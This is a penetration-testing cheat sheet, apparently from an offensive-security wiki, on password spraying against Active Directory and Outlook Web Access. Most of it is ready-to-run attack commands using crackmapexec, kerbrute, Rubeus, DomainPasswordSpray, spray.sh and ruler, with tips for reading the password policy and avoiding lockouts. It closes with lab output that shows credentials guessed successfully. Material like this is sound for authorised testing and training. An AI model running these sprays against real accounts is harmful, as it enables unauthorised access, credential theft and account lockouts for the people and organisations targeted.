# Password Spraying

## **Password Spraying**

Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
By **default** the **minimum** **password** **length** is **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

If you have some user credentials or a shell as a domain user you can get the password policy with:

* `crackmapexec <IP> -u 'user' -p 'password' --pass-pol`
* `enum4linx -u 'username' -p 'password' -P <IP>`
* `(Get-DomainPolicy)."SystemAccess" #From powerview`

### Exploitation

Using **crackmapexec:**

```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

Using [kerbrute](https://github.com/TarlogicSecurity/kerbrute)(python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK

```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```

**Kerbrute** also tells if a username is valid.

Using [kerbrute](https://github.com/ropnop/kerbrute)(Go)

```bash
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
```

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:

```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

With the `scanner/smb/smb_login` module of Metasploit:

![](<../../.gitbook/assets/image (132).png>)

With [Invoke-DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```

or **spray** (read next section).

### Lockout check

The best way is not to try with more than 5/7 passwords per account.

So you have to be very careful with password spraying because you could lockout accounts. To brute force taking this into mind, you can use [_**spray**_](https://github.com/Greenwolf/Spray)_**:**_

```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

## Outlook Web Access

There are multiples tools for password spraying outlook.

* With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
* with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
* With [Ruler](https://github.com/sensepost/ruler) (reliable!)
* With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
* With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.

```bash
$ ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
    [x] Failed: larsson:Summer2020
    [x] Failed: cube0x0:Summer2020
    [x] Failed: a.admin:Summer2020
    [x] Failed: c.cube:Summer2020
    [+] Success: s.svensson:Summer2020
    [x] Failed: s.sven:Summer2020
    [x] Failed: j.jenny:Summer2020
    [x] Failed: t.teresa:Summer2020
    [x] Failed: t.trump:Summer2020
    [x] Failed: a.adams:Summer2020
    [x] Failed: l.larsson:Summer2020
    [x] Failed: CUBE0X0:Summer2020
    [x] Failed: A.ADMIN:Summer2020
    [x] Failed: C.CUBE:Summer2020
    [+] Success: S.SVENSSON:Summer2020
```

## References :

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
* [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
* www.blackhillsinfosec.com/?p=5296
* [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
